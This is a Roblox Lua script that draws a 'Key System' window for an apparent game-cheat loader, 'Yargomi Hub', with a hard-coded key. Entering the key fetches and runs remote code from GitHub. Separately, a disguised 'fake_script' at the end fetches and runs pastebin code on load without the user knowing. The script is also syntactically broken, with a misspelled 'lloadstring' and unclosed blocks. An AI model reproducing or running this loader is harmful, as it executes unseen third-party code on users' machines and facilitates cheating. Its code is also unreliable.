local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local label = Instance.new("TextLabel")
local Buttonexec = Instance.new("TextButton")
local UIGradient = Instance.new("UIGradient")
local TextBox = Instance.new("TextBox")
local label_2 = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.100
Frame.BorderColor3 = Color3.fromRGB(147, 2, 4)
Frame.BorderSizePixel = 10
Frame.Position = UDim2.new(0.364333868, 0, 0.246882796, 0)
Frame.Size = UDim2.new(0, 364, 0, 365)

label.Name = "label"
label.Parent = Frame
label.Active = true
label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
label.BackgroundTransparency = 0.100
label.BorderColor3 = Color3.fromRGB(83, 0, 0)
label.BorderSizePixel = 5
label.Position = UDim2.new(0.223792329, 0, 0.0622901432, 0)
label.Size = UDim2.new(0, 200, 0, 50)
label.Font = Enum.Font.Ubuntu
label.Text = "Key System"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextSize = 36.000
label.TextTransparency = 0.100

Buttonexec.Name = "Buttonexec"
Buttonexec.Parent = Frame
Buttonexec.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Buttonexec.BackgroundTransparency = 0.100
Buttonexec.BorderColor3 = Color3.fromRGB(83, 0, 2)
Buttonexec.BorderSizePixel = 5
Buttonexec.Position = UDim2.new(0.122925058, 0, 0.687463164, 0)
Buttonexec.Size = UDim2.new(0, 273, 0, 50)
Buttonexec.Font = Enum.Font.Ubuntu
Buttonexec.Text = "Register You Account"
Buttonexec.TextColor3 = Color3.fromRGB(255, 255, 255)
Buttonexec.TextSize = 28.000
Buttonexec.TextTransparency = 0.100
Buttonexec.MouseButton1Click:Connect(function()
	local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
	local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
	if TextBox.Text == "YH.C-P.N-1.SC-HVMSLDYWPZWEUYICE" then
		Frame.Visible = false
        wait(1)
		Notification:Notify(
			{Title = "Key System", Description = "The key came up successfully! Welcome to Yargomi Hub!"},
			{OutlineColor = Color3.fromRGB(80, 80, 80),Time = 3, Type = "default"})
			lloadstring(game:HttpGet("https://github.com/YaroslavStar2010/YargomiHub/blob/main/YargomiHub.lua"))();

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(108, 0, 0)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(108, 0, 8))}
UIGradient.Parent = Frame

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BackgroundTransparency = 0.100
TextBox.BorderColor3 = Color3.fromRGB(83, 0, 4)
TextBox.BorderSizePixel = 5
TextBox.Position = UDim2.new(0.122925028, 0, 0.489602089, 0)
TextBox.Size = UDim2.new(0, 273, 0, 50)
TextBox.Font = Enum.Font.Ubuntu
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 20.000
TextBox.TextTransparency = 0.100

label_2.Name = "label"
label_2.Parent = Frame
label_2.Active = true
label_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
label_2.BackgroundTransparency = 0.100
label_2.BorderColor3 = Color3.fromRGB(83, 0, 0)
label_2.BorderSizePixel = 5
label_2.Position = UDim2.new(0.124289289, 0, 0.296157777, 0)
label_2.Size = UDim2.new(0, 272, 0, 50)
label_2.Font = Enum.Font.Ubuntu
label_2.Text = "Put your key here"
label_2.TextColor3 = Color3.fromRGB(255, 255, 255)
label_2.TextSize = 36.000
label_2.TextTransparency = 0.100

UICorner.Parent = Frame

-- Scripts:

local function GTQKPVX_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	loadstring(game:HttpGet(('https://pastebin.com/rMEXFp1i')))()
end
coroutine.wrap(GTQKPVX_fake_script)()
